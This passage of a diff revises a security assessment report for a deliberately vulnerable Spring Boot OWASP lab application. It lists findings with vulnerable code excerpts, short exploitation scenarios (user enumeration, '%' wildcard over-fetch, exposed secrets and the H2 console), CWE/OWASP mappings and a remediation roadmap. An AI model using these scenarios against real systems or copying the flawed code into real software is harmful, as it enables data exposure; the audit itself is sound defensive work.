-- **Business Impact:** Direct, GUI-driven database compromise.
-- **Confidence Level:** High
-
----
-
-### VULN-018 — Information Disclosure via `/vulnerabilities` Index
-
-- **Vulnerability Name:** Public endpoint renders hardcoded secrets and full vulnerability inventory
-- **CWE ID:** CWE-200, CWE-209 (Generation of Error Message Containing Sensitive Information)
-- **OWASP Top 10 Category:** A05:2021 — Security Misconfiguration
 - **Severity:** Low
-- **Affected File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\controller\VulnerabilityController.java`
-- **Affected Method / Class:** `VulnerabilityController.index()`
-- **Exact Vulnerable Code Snippet:**
+- **CWE:** CWE-20
+- **OWASP Top 10 (2021):** A04 Insecure Design
+- **File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\controller\UserController.java`
+- **Method / Class:** `search(String)`
+- **Evidence (lines 71-77):**
   ```java
-  @GetMapping(produces = MediaType.TEXT_HTML_VALUE)
-  public String index() {
-      // VULNERABILITY (A05:2021): hardcoded secrets rendered into the
-      // HTML response on this page itself.
-      return """
-          ...
-          <h2>Hardcoded secrets (A02 / A05)</h2>
-          <ul>
-            <li>API key: %s</li>
-            <li>DB password: %s</li>
-          </ul>
-          ...
-          """.formatted(apiKey, dbPassword);
+  @GetMapping("/search")
+  public ResponseEntity<List<User>> search(@RequestParam("q") String q) {
+      return ResponseEntity.ok()
+              .cacheControl(CacheControl.noStore())
+              .body(userService.findByUsernameUnsafe(q));
   }
   ```
-- **Root Cause:** The `@Value` autowired secrets are interpolated directly into the HTML response (no escaping, no auth). The page also publishes an inventory of every vulnerable endpoint, lowering the cost of an attack.
-- **Exploitation Scenario:** Anonymous visitors (and search-engine crawlers if exposed) harvest the secrets and the attack-surface map.
-- **Business Impact:** Reconnaissance as a service.
-- **Confidence Level:** High
+- **Root cause:** No `@NotBlank`, no `@Size(max=...)`. The query reaches a parameterised native SQL (`UserService.java` line 40), so SQLi is not a risk, but the endpoint will execute a full-table scan for `%`-style payloads and accept arbitrarily long strings.
+- **Exploitation scenario:** `?q=%25` returns every user; `?q=` (empty) returns nothing but issues a query; billion-laughs on a very long `q`.
+- **Business impact:** Slow query DoS; data over-fetch.
+- **Recommended fix:** Add `@NotBlank @Size(max=64) String q` via `@Validated` on the controller; trim and reject if `q.contains("%")` is not a feature.
+- **Remediation status:** Not Applied
+
+### S16 - `UserController.getProfile` returns 404 on missing user, 200 on forbidden - minor info leak
+
+- **Severity:** Low
+- **CWE:** CWE-200 Information Disclosure
+- **OWASP Top 10 (2021):** A01 Broken Access Control
+- **File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\controller\UserController.java`
+- **Method / Class:** `getProfile(Long, UserDetails)`
+- **Evidence (lines 57-65):**
+  ```java
+  User target = userService.findByIdUnsafe(id);
+  if (target == null) {
+      return ResponseEntity.notFound().build();
+  }
+  boolean isAdmin = caller.getAuthorities().stream()
+          .anyMatch(a -> "ROLE_ADMIN".equals(a.getAuthority()));
+  if (!isAdmin && !caller.getUsername().equals(target.getUsername())) {
+      throw new AccessDeniedException("Cannot view another user's profile");
+  }
+  ```
+- **Root cause:** The 404/403 dichotomy lets an attacker distinguish "no such user" from "this user exists but you can't see it". Minor; common in REST APIs.
+- **Exploitation scenario:** Probe `id` values to enumerate which user IDs exist.
+- **Business impact:** Account enumeration.
+- **Recommended fix:** Always return 404 (or 403) regardless of existence. Or use the service-layer `findByIdForCaller` and return its `null`.
+- **Remediation status:** Not Applied
+
+### S17 - Login-failure log lacks username / source IP
+
+- **Severity:** Low
+- **CWE:** CWE-778 Insufficient Logging
+- **OWASP Top 10 (2021):** A09 Security Logging & Monitoring Failures
+- **File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\controller\AuthController.java`
+- **Evidence (lines 53-56):**
+  ```java
+  org.slf4j.LoggerFactory.getLogger(AuthController.class)
+          .warn("Failed login attempt for username of length {}",
+                  username == null ? 0 : username.length());
+  ```
+- **Root cause:** Logs only the *length* of the username. A SIEM cannot correlate attempts against a specific user, and the rate-limit filter is the only place the source IP is captured (and that is in-memory only, see S6).
+- **Recommended fix:** Log the username (or its SHA-256) and the source IP; emit a structured log event (`log.warn("auth.fail", kv("user", user), kv("ip", ip))`).
+- **Remediation status:** Not Applied
+
+### S18 - `DataSeeder` runs in every profile
+
+- **Severity:** Medium
+- **CWE:** CWE-1188 Insecure Default Initialization
+- **OWASP Top 10 (2021):** A05 Security Misconfiguration
+- **File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\config\DataSeeder.java`
+- **Evidence (lines 26-30):**
+  ```java
+  @Bean
+  CommandLineRunner seed(UserRepository userRepository,
+                         ProductRepository productRepository,
+                         CommentRepository commentRepository,
+                         PasswordEncoder passwordEncoder) {
+  ```
+- **Root cause:** No `@Profile("sandbox")` and no `@ConditionalOnProperty`. The seeder is a top-level `@Configuration` and runs on every startup, including any future production deployment of this artifact.
+- **Exploitation scenario:** Operators who "just run the jar" in a public environment will have the admin account present.
+- **Business impact:** Default-credential access in prod.
+- **Recommended fix:** Add `@Profile("!prod & sandbox")` or `@ConditionalOnProperty(name="app.seed.enabled", havingValue="true", matchIfMissing=false)`.
+- **Remediation status:** Not Applied
+
+### S19 - No HTTP security headers at the controller level
+
+- **Severity:** Informational
+- **CWE:** CWE-693 Protection Mechanism Failure
+- **OWASP Top 10 (2021):** A05 Security Misconfiguration
+- **Files:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\config\SecurityConfig.java`
+- **Evidence (lines 73-85):** Headers are configured at the filter chain level. CSP is set, HSTS is set, X-Content-Type-Options / X-Frame-Options / Referrer-Policy are set, but `Permissions-Policy`, `Cross-Origin-Opener-Policy`, `Cross-Origin-Embedder-Policy`, and `Cross-Origin-Resource-Policy` are not. There is no `X-Permitted-Cross-Domain-Policies: none`.
+- **Root cause:** Defence-in-depth header set is incomplete; relying solely on Spring Security defaults means any future endpoint registered outside the chain (e.g., a custom `WebMvcConfigurer` addResourceHandler) bypasses the headers.
+- **Recommended fix:** Add the missing headers via a `OncePerRequestFilter` registered with `FilterRegistrationBean` at high precedence; pin CSP to `default-src 'none'` for endpoints that do not need scripts.
+- **Remediation status:** Not Applied
+
+### S20 - `VulnerabilityController` is publicly reachable
+
+- **Severity:** Informational
+- **CWE:** CWE-200 Information Disclosure
+- **OWASP Top 10 (2021):** A05 Security Misconfiguration
+- **File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\controller\VulnerabilityController.java`
+- **Evidence (lines 22-59):** Returns a public HTML page that lists every vulnerable endpoint in the application, including the de-remediated history.
+- **Root cause:** Lab-only documentation. In a real deployment, this would be a recon goldmine.
+- **Recommended fix:** Remove the controller for non-lab profiles (`@Profile("sandbox")`); never deploy the controller.
+- **Remediation status:** Not Applied
+
+### S21 - No `@ControllerAdvice` global exception handler
+
+- **Severity:** Informational
+- **CWE:** CWE-209 Generation of Error Message Containing Sensitive Information
+- **OWASP Top 10 (2021):** A09 Security Logging & Monitoring Failures
+- **Files:** entire `controller` package
+- **Root cause:** `AccessDeniedException` thrown by `AuthController.transfer` (line 98, 109) and `UserController.listUsers` (line 44), `UserController.getProfile` (line 55, 64) reaches Spring's default error attributes. The properties set `server.error.include-stacktrace=never` and `server.error.include-message=never`, which suppresses the *body*, but the *status* (`403`) and the *path* still appear in the error log. There is no controller advice to map domain exceptions to stable JSON envelopes.
+- **Recommended fix:** Add a `@RestControllerAdvice` that maps `AccessDeniedException` to 403, `MethodArgumentNotValidException` to 400, and `DataIntegrityViolationException` to 409; log at WARN with the principal name and the request path.
+- **Remediation status:** Not Applied
 
 ---
 
-## 4. Negative Findings (Checks Performed, No Issue Observed)
+## 4. Dependency & Configuration Findings
 
-The following checks were performed and yielded **no additional findings** beyond those already documented above. They are listed here to make the audit scope explicit.
+### D1 - `spring-boot-starter-parent` 3.2.5 (no live CVE scan run)
 
-- **Command Injection** — `Grep` for `Runtime`, `ProcessBuilder`, `exec(` over `src/` returned zero matches. **No issue.**
-- **Jackson default typing** — No `@JsonTypeInfo` annotations and no `enableDefaultTyping()` calls found. The application does not use polymorphic Jackson deserialization. **No issue.**
-- **Path Traversal / File Operations** — No `new File(...)`, `Paths.get(...)`, or `FileInputStream` use of user input found. **No issue.**
-- **LDAP / NoSQL Injection** — No LDAP or MongoDB code present in this H2/JPA project. **Not applicable.**
-- **SpEL/OGNL Injection** — No `SpelExpressionParser`, no `@PreAuthorize("...")` with user-controlled expressions. **No issue.**
-- **Insecure RNG** — `java.util.Random` does not appear in `src/`. **No issue.**
-- **TLS configuration** — The project runs on plain HTTP only; TLS is not configured but is also not configured *insecurely* (no self-signed cert with `verify=false`); it is simply absent. The application must always be fronted by a TLS-terminating proxy if exposed. **Low informational note** — recommend an HSTS-aware reverse proxy.
-- **Weak hashing algorithms** — `MessageDigest.getInstance("MD5"|"SHA-1")` does not appear in `src/`. **No issue** (the absence of hashing is itself VULN-004).
-- **Missing `@Valid` on `@RequestBody`** — `@RequestBody` parameters (`UserController`, `ProductController`, `CommentController`) lack `@Valid` / bean-validation constraints. Flagged under VULN-006 / VULN-012 but noted separately for completeness; severity is captured by the access-control and mass-assignment findings because there is no auth boundary to break.
+- **Severity:** Medium
+- **CWE:** CWE-1104 Use of Unmaintained Third-Party Components
+- **OWASP Top 10 (2021):** A06 Vulnerable & Outdated Components
+- **File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\pom.xml`
+- **Evidence (lines 14-19):**
+  ```xml
+  <parent>
+      <groupId>org.springframework.boot</groupId>
+      <artifactId>spring-boot-starter-parent</artifactId>
+      <version>3.2.5</version>
+      <relativePath/>
+  </parent>
+  ```
+- **Root cause:** Spring Boot 3.2.5 was released in 2024; the 3.2.x line is now in OSS support / end-of-life per Spring's support policy. Several CVEs have been filed against 3.2.x prior patch releases. We did not run `mvn dependency-check:check` in this assessment, so we cannot enumerate them authoritatively.
+- **Recommended fix:** Bump to the latest 3.2.x patch (or 3.3.x / 3.4.x if the dependency surface allows). Wire `dependency-check-maven` into `verify` so the build fails on CVEs.
+- **Remediation status:** Not Applied
+
+### D2 - H2 2.x (no live CVE scan run)
+
+- **Severity:** Low
+- **CWE:** CWE-1104
+- **OWASP Top 10 (2021):** A06 Vulnerable & Outdated Components
+- **File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\pom.xml`
+- **Evidence (lines 59-63):**
+  ```xml
+  <dependency>
+      <groupId>com.h2database</groupId>
+      <artifactId>h2</artifactId>
+      <scope>runtime</scope>
+  </dependency>
+  ```
+- **Root cause:** The H2 version is inherited from the Spring Boot BOM (managed by `spring-boot-dependencies` 3.2.5). H2 has had multiple historical CVEs (e.g., CVE-2021-23463, CVE-2022-23221, CVE-2018-10054). Live CVE feed not consulted.
+- **Recommended fix:** Pin to the latest 2.x release; do not ship H2 in prod (`<scope>runtime</scope>` should be replaced with a profile that excludes it).
+- **Remediation status:** Not Applied
+
+### D3 - `dependency-check-maven` is not bound to a phase
+
+- **Severity:** Medium
+- **CWE:** CWE-1104
+- **OWASP Top 10 (2021):** A06 Vulnerable & Outdated Components
+- **File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\pom.xml`
+- **Evidence (lines 101-108):**
+  ```xml
+  <plugin>
+      <groupId>org.owasp</groupId>
+      <artifactId>dependency-check-maven</artifactId>
+      <version>9.2.0</version>
+      <configuration>
+          <failBuildOnAnyVulnerability>false</failBuildOnAnyVulnerability>
+      </configuration>
+  </plugin>
+  ```
+- **Root cause:** The plugin is declared but not bound to any phase; `<failBuildOnAnyVulnerability>false</failBuildOnAnyVulnerability>` is the default and the plugin is not registered in `<executions>`. A regular `mvn verify` will never invoke it. The comment in `pom.xml` (lines 94-100) acknowledges this is an opt-in scan.
+- **Recommended fix:** Add `<executions><execution><goals><goal>check</goal></goals></execution></executions>` and set `<failBuildOnAnyVulnerability>true</failBuildOnAnyVulnerability>` (or a CVSS threshold). Pin a NVD mirror.
+- **Remediation status:** Not Applied
+
+### C1 - `spring.datasource.password=` empty
+
+- **Severity:** Informational
+- **CWE:** CWE-1188
+- **OWASP Top 10 (2021):** A05 Security Misconfiguration
+- **File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\resources\application.properties`
+- **Evidence (lines 17-20):**
+  ```
+  spring.datasource.url=jdbc:h2:mem:owaspdb;DB_CLOSE_DELAY=-1
+  spring.datasource.driver-class-name=org.h2.Driver
+  spring.datasource.username=sa
+  spring.datasource.password=
+  ```
+- **Root cause:** Empty password is correct for in-memory H2 `sa`, but the `datasource` block is not a profile-gated block - if a non-sandbox profile overrides the URL to a real database, the empty password remains a real (and silent) footgun.
+- **Recommended fix:** Move the H2 block into a `application-sandbox.properties` and activate it via `--spring.profiles.active=sandbox`; in `application.properties` leave only `${SPRING_DATASOURCE_PASSWORD}` and require it at startup.
+- **Remediation status:** Not Applied
+
+### C2 - `spring.jpa.hibernate.ddl-auto=create`
+
+- **Severity:** Low
+- **CWE:** CWE-1188
+- **OWASP Top 10 (2021):** A05 Security Misconfiguration
+- **File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\resources\application.properties`
+- **Evidence (line 37):**
+  ```
+  spring.jpa.hibernate.ddl-auto=create
+  ```
+- **Root cause:** `create` drops and recreates the schema on every restart. If this profile is ever pointed at a real DB, the application will silently wipe data.
+- **Recommended fix:** Default to `validate`; gate `create`/`create-drop` on a `sandbox` profile.
+- **Remediation status:** Not Applied
+
+### C3 - Error attribute keys not fully pinned
+
+- **Severity:** Low
+- **CWE:** CWE-209
+- **OWASP Top 10 (2021):** A05 Security Misconfiguration
+- **File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\resources\application.properties`
+- **Evidence (lines 54-55):**
+  ```
+  server.error.include-stacktrace=never
+  server.error.include-message=never
+  ```
+- **Root cause:** `include-binding-errors` and `include-exception` are not set; the default for both is `never`, but explicit pinning is defence-in-depth. Also, the response is not gated on `/error` being authenticated (it is in the `permitAll` list, which is correct for an error page but means the error *path* is reachable without auth).
+- **Recommended fix:** Add `server.error.include-binding-errors=never` and `server.error.include-exception=false` explicitly. Consider a `@ControllerAdvice` that returns a stable JSON envelope.
+- **Remediation status:** Not Applied
+
+### C4 - `app.secret.jwt.signing.key` defaults to empty string
+
+- **Severity:** High
+- **CWE:** CWE-321
+- **OWASP Top 10 (2021):** A02 Cryptographic Failures
+- **File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\resources\application.properties`
+- **Evidence (line 34):**
+  ```
+  app.secret.jwt.signing.key=${APP_SECRET_JWT_SIGNING_KEY:}
+  ```
+- **Root cause:** Same as S2. The placeholder defaults to empty; no minimum-length check at startup.
+- **Recommended fix:** Use a non-empty `defaultValue` that throws at startup (or omit the default and let `@Value` throw); add a `@PostConstruct` length check in `SecretConfig`.
+- **Remediation status:** Not Applied
 
 ---
 
-## 5. Dependency Risk Review
+## 5. OWASP Top 10 (2021) Mapping
 
-### 5.1 `pom.xml` Inventory
-
-```xml
-<parent>
-    <groupId>org.springframework.boot</groupId>
-    <artifactId>spring-boot-starter-parent</artifactId>
-    <version>3.2.5</version>
-</parent>
-
-<dependencies>
-    spring-boot-starter-web
-    spring-boot-starter-data-jpa
-    spring-boot-starter-security
-    h2 (runtime)
-    lombok (optional)
-    spring-boot-starter-test (test)
-</dependencies>
-```
-
-### 5.2 Observations
-
-- **Spring Boot 3.2.5 (released June 2024)** — No known Critical CVEs at the time of this review, but several 3.2.x point releases have shipped security fixes (e.g. Spring Framework 6.1.x advisories). Pinning to a specific patch version rather than `3.2.5` is recommended.
-- **Spring Security 6.2.x** (transitive via Boot 3.2.5) — bundled with the parent; no override.
-- **H2 2.x** (transitive) — multiple historical CVEs against older versions; 2.x is current but pinning the exact patch is recommended.
-- **Lombok** — not a runtime dependency (optional, excluded from final jar), low risk.
-- **No Apache Commons Text, no Log4j (uses Logback), no Jackson-databind polymorphism** — these common vulnerability hotspots are not in scope.
-
-### 5.3 Caveat
-
-> Authoritative CVE cross-referencing requires up-to-date data. Run `mvn org.owasp:dependency-check-maven:check` or `mvn -P vulnerability-check verify` against the National Vulnerability Database before shipping. This report flags dependency posture qualitatively, not against a CVE feed.
-
----
-
-## 6. OWASP Top 10 (2021) Mapping
-
-| OWASP Category | Findings |
+| OWASP 2021 | Findings |
 |---|---|
-| **A01:2021 — Broken Access Control** | VULN-005, VULN-006, VULN-011 (CSRF contributes to access-control failure), VULN-012 |
-| **A02:2021 — Cryptographic Failures** | VULN-004, VULN-009, VULN-010, VULN-013 |
-| **A03:2021 — Injection (SQLi / XSS)** | VULN-002, VULN-003, VULN-007, VULN-008 |
-| **A04:2021 — Insecure Design** | VULN-009 (response contract), VULN-012, VULN-014 (logging by design) |
-| **A05:2021 — Security Misconfiguration** | VULN-010, VULN-011, VULN-016, VULN-017, VULN-018 |
-| **A06:2021 — Vulnerable & Outdated Components** | See Section 5 (Dependency Risk). No CVEs flagged; recommend `dependency-check`. |
-| **A07:2021 — Identification & Authentication Failures** | VULN-004 (plaintext creds), VULN-005 (no auth), VULN-009 (password leak) |
-| **A08:2021 — Software & Data Integrity Failures** | VULN-001 (unsafe deserialization) |
-| **A09:2021 — Security Logging & Monitoring Failures** | VULN-014 (excessive logging of secrets), VULN-015 (no auth-event logging) |
-| **A10:2021 — Server-Side Request Forgery (SSRF)** | No outbound HTTP / URL-fetching code present. **Not exploitable** in current code. |
+| A01 Broken Access Control | S7, S16 |
+| A02 Cryptographic Failures | S1, S2, C4 |
+| A03 Injection (XSS) | S10, S11 |
+| A04 Insecure Design | S6, S13, S14, S15 |
+| A05 Security Misconfiguration | S4, S5, S8, S12, S18, S19, S20, C1, C2, C3 |
+| A06 Vulnerable & Outdated Components | D1, D2, D3 |
+| A07 Identification & Authentication Failures | S3 |
+| A08 Software & Data Integrity Failures | S9 |
+| A09 Security Logging & Monitoring Failures | S5, S17, S21 |
+| A10 SSRF | (none observed) |
 
 ---
 
-## 7. CWE Mapping
+## 6. CWE Mapping
 
-| CWE | Description | Findings |
-|---|---|---|
-| CWE-79 | Improper Neutralization of Input During Web Page Generation (XSS) | VULN-007, VULN-008 |
-| CWE-89 | Improper Neutralization of Special Elements used in an SQL Command | VULN-002, VULN-003 |
-| CWE-200 | Exposure of Sensitive Information to an Unauthorized Actor | VULN-009, VULN-014, VULN-018 |
-| CWE-201 | Insertion of Sensitive Information Into Sent Data | VULN-009 |
-| CWE-209 | Generation of Error Message Containing Sensitive Information | VULN-018 |
-| CWE-256 | Plaintext Storage of a Password | VULN-004 |
-| CWE-257 | Storing Passwords in a Recoverable Format | VULN-004 |
-| CWE-269 | Improper Privilege Management | VULN-012 |
-| CWE-284 | Improper Access Control | VULN-005, VULN-006, VULN-017 |
-| CWE-285 | Improper Authorization | VULN-005 |
-| CWE-330 | Use of Insufficiently Random Values | VULN-013 |
-| CWE-340 | Generation of Predictable Numbers/Identifiers | VULN-013 |
-| CWE-352 | Cross-Site Request Forgery | VULN-011 |
-| CWE-359 | Exposure of Private Personal Information (PII) | VULN-009 |
-| CWE-502 | Deserialization of Untrusted Data | VULN-001 |
-| CWE-532 | Insertion of Sensitive Information into Log File | VULN-014 |
-| CWE-547 | Use of Hard-coded, Security-relevant Constants | VULN-010 |
-| CWE-639 | Authorization Bypass Through User-Controlled Key (IDOR) | VULN-006 |
-| CWE-668 | Exposure of Resource to Wrong Sphere | VULN-017 |
-| CWE-693 | Protection Mechanism Failure | VULN-016 |
-| CWE-778 | Insufficient Logging | VULN-015 |
-| CWE-798 | Use of Hard-coded Credentials | VULN-010, VULN-013 |
-| CWE-862 | Missing Authorization | VULN-005 |
-| CWE-915 | Improperly Controlled Modification of Dynamically-Determined Object Attributes | VULN-012 |
-| CWE-916 | Use of Password Hash With Insufficient Computational Effort | VULN-004 |
-| CWE-1021 | Improper Restriction of Rendered UI Layers or Frames | VULN-016 |
+| CWE | Findings |
+|---|---|
+| CWE-20 Improper Input Validation | S13, S14, S15 |
+| CWE-79 XSS | S10, S11 |
+| CWE-200 Information Disclosure | S16, S20 |
+| CWE-209 Error Message Information Disclosure | S21, C3 |
+| CWE-306 Missing Authentication for Critical Function | S4, S8 |
+| CWE-319 Cleartext Transmission | S1 |
+| CWE-321 Hard-coded / Predictable Cryptographic Key | S2, C4 |
+| CWE-348 Use of Less Trusted Source | S6 |
+| CWE-352 CSRF | S12 |
+| CWE-502 Deserialization of Untrusted Data | S9 |
+| CWE-521 Weak Password Requirements | S3 |
+| CWE-532 Sensitive Information in Log | S5 |
+| CWE-639 Authorization Bypass Through User-Controlled Key | S7 |
+| CWE-693 Protection Mechanism Failure | S19 |
+| CWE-770 Allocation of Resources Without Limits | S6 |
+| CWE-778 Insufficient Logging | S17 |
+| CWE-1104 Unmaintained Third-Party Components | D1, D2, D3 |
+| CWE-1188 Insecure Default Initialization | S4, S8, S18, C1, C2 |
 
 ---
 
-## 8. Priority Remediation Roadmap
+## 7. Priority Remediation Roadmap
 
-### 8.1 Critical — Immediate (block deploy)
+Ordered Critical -> Low. **This run did not apply any of the following.** The remediation agent (downstream) should consume this section.
 
-1. **VULN-001 — Unsafe deserialization** (CWE-502). Delete `InsecureDeserializationController` entirely if not needed. If it must remain for the lab, install a strict `ObjectInputFilter` (`setObjectInputFilter`) that rejects all classes by default and allowlists only a benign marker. Better: replace with JSON via Jackson and explicit DTOs.
-2. **VULN-002 / VULN-003 — SQL injection.** Replace both `createNativeQuery` concatenations with parameterized queries (`EntityManager.createNativeQuery(sql, User.class).setParameter(1, username)`) or, better, use the existing safe `UserRepository.findByUsername(String)`.
-3. **VULN-004 — Plain-text passwords.** Configure `BCryptPasswordEncoder` (or Argon2) as a `@Bean`, hash on `register`, hash on `DataSeeder`, and store only the hash. Never return the hash from any API response.
-4. **VULN-005 — `permitAll()` everywhere.** Replace with explicit `authorizeHttpRequests` matchers; require authentication on every endpoint except `/login` and `/register`. Add a `UserDetailsService`, password encoder, and JWT/session filter as appropriate.
-5. **VULN-006 — IDOR + unauthenticated transfer.** In `AuthController.transfer`, inject `Principal` and reject if `principal.getName() != from.username`. In `UserController.getProfile`, do the same. Reject any `role` field from the request body (VULN-012) by binding to a dedicated `RegisterRequest` DTO that omits `role`.
-
-### 8.2 High — Before any external exposure
-
-6. **VULN-007 / VULN-008 — XSS.** Replace the manual HTML concatenation in `CommentController` and `CommentViewController` with Thymeleaf templates (which escape by default) or use `HtmlUtils.htmlEscape(...)`. Add `Content-Security-Policy: default-src 'self'; script-src 'self'` to every response. Reject stored comments containing `<` or `>` on submit.
-7. **VULN-009 — Password in API response.** Remove the `"password"` key from the `login` response entirely. Consider a dedicated DTO `LoginResponse(id, username, role)` so the password field cannot leak by accident.
-8. **VULN-010 — Hardcoded secrets.** Remove the `app.secret.*` keys from `application.properties`. Load via `${APP_SECRET_API_KEY}` with `application-local.properties` gitignored, or pull from Spring Cloud Config / HashiCorp Vault. Purge the values from git history with `git filter-repo`.
-9. **VULN-011 — CSRF.** Re-enable CSRF (`csrf { }`) for any browser-facing flow. If stateless JWT, leave CSRF disabled but require a bearer token (not cookies) for state-changing endpoints — and set `CookieCsrfTokenRepository` for any cookie-based flow.
-10. **VULN-012 — Mass-assignment role.** Remove `role` from the request-body Map; bind to a `RegisterRequest(username, password, email)` DTO and default the role to `USER` server-side. Require admin authentication to elevate to ADMIN.
-
-### 8.3 Medium — Within next iteration
-
-11. **VULN-013 — JWT signing key.** Generate a 256-bit key from `SecureRandom`, persist in a secrets manager, expose via a `KeyProvider` bean. Rotate. If JWT verification is added, reject any token signed with the legacy hardcoded key.
-12. **VULN-014 — Verbose SQL logging.** Set `spring.jpa.show-sql=false` and `logging.level.org.hibernate.*=WARN` in production. Mask bind parameters in logs.
-13. **VULN-015 — Auth-event logging.** Add `AuthenticationFailureBadCredentialsEvent`, `AuthenticationSuccessEvent` listeners; emit structured logs to a SIEM. Rate-limit `/api/login` (Bucket4j) and `/api/transfer`.
-14. **VULN-016 — Security headers.** Add `.headers(h -> h.contentSecurityPolicy("default-src 'self'").frameOptions(...).httpStrictTransportSecurity().referrerPolicy(...))`.
-
-### 8.4 Low — Hygiene
-
-15. **VULN-017 — H2 console.** Disable in non-local profiles: `spring.h2.console.enabled=${H2_CONSOLE_ENABLED:false}`.
-16. **VULN-018 — Public `/vulnerabilities` page.** Gate behind an `ADMIN` role, or remove entirely from the production jar via a Spring profile.
-17. **General** — Pin all dependency versions in `pom.xml` to specific patch releases; run `mvn org.owasp:dependency-check-maven:check` in CI.
-18. **General** — Add `@Valid` to every `@RequestBody` parameter and define `jakarta.validation` constraints on all incoming DTOs (`@NotBlank`, `@Email`, `@Size(max=2000)`, etc.).
+1. **S2 / C4 - JWT signing key may be empty** (High). Validate at startup: `if (jwtSigningKey == null || jwtSigningKey.length() < 32) throw new IllegalStateException(...)`. Change `application.properties` to require the env var (`app.secret.jwt.signing.key=${APP_SECRET_JWT_SIGNING_KEY}` with no default).
+2. **S4 / S8 - H2 console opt-in is unauthenticated** (High). Replace `permitAll` on `/h2-console/**` with `hasRole('ADMIN')` and Basic auth, or remove the chain entirely and add a profile-gated H2 Maven dependency.
+3. **S1 - HTTP Basic without TLS** (High). Add `server.ssl.*` to `application.properties`; terminate TLS at a proxy in production. Replace HTTP Basic with a token-based scheme in a follow-up.
+4. **S3 - Seed admin account** (High). Gate `DataSeeder` on `@Profile("sandbox")`; emit a WARN log on every seed. Move seed passwords to a generated random value.
+5. **S7 - `findByIdUnsafe` retained** (High). Delete the deprecated method; route every call through `findByIdForCaller`.
+6. **S6 - Rate limiter bypass via path and `X-Forwarded-For`** (Medium). Use `AntPathRequestMatcher("/api/login")`; read forwarded IP only from a trusted proxy CIDR; back the counter with Redis/Bucket4j.
+7. **S18 - `DataSeeder` not profile-gated** (Medium). `@Profile("!prod")` or `@ConditionalOnProperty`.
+8. **D1 / D3 - Spring Boot 3.2.5 + unscanned dependencies** (Medium). Bump to latest 3.2.x; bind `dependency-check-maven` to `verify` with a CVSS threshold.
+9. **S5 / S17 / S21 - Logging** (Medium / Low). Add structured audit events; add `@RestControllerAdvice`.
+10. **S9 - `Map.class` deserialization** (Medium). Replace with a strict DTO; cap request body size; require auth.
+11. **S10 / S11 - Hand-built HTML** (Medium). Migrate to Thymeleaf; add `nosniff` regression test.
+12. **S13 / S14 - `Map<String,Object>` controllers** (Medium). Introduce `RegisterRequest` and `TransferRequest` DTOs with `@Valid`.
+13. **S15 - Un-validated `q`** (Low). `@Validated` + `@Size(max=64)` on `UserController.search`.
+14. **S12 / S16 / S19 / S20 / C1 / C2 / C3** (Low / Informational). Apply the per-finding recommendations; treat as backlog.
+15. **D2 - H2 CVE** (Low). Pin a known-good 2.x version; do not ship H2 to prod.
+16. **C2 / C3 - `ddl-auto=create` and error attributes** (Low). Gate on `sandbox`; pin error attributes.
 
 ---
 
-## 9. Audit Metadata
+## 8. Appendix: File Inventory Scanned
 
-- **Report path:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\.claude\reports\SECURITY_ASSESSMENT_REPORT.md`
-- **Files inspected:** 22 source files + `pom.xml` + `application.properties` + workflow file + `.gitignore`
-- **Tools used:** Read, Glob, Grep, Write (Write used only for this report)
-- **Source code modifications:** **None.** Read-only audit.
-- **Application executed:** **No.** Static review only.
-- **Recommendation:** This codebase must remain in a tightly isolated local sandbox. The README's own warning ("DO NOT deploy this application to any public server, container image registry, or shared network") is correct and binding.
+### Java sources (read in full)
 
----
+- `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\VulnerableSpringAppApplication.java`
+- `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\config\DataSeeder.java`
+- `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\config\JpaUserDetailsService.java`
+- `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\config\SecurityConfig.java`
+- `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\config\PasswordConfig.java`
+- `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\config\SecretConfig.java`
+- `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\config\LoginRateLimitFilter.java`
+- `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\controller\AuthController.java`
+- `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\controller\UserController.java`
+- `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\controller\ProductController.java`
+- `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\controller\CommentController.java`
+- `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\controller\CommentViewController.java`
+- `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\controller\InsecureDeserializationController.java`
+- `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\controller\VulnerabilityController.java`
+- `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\service\UserService.java`
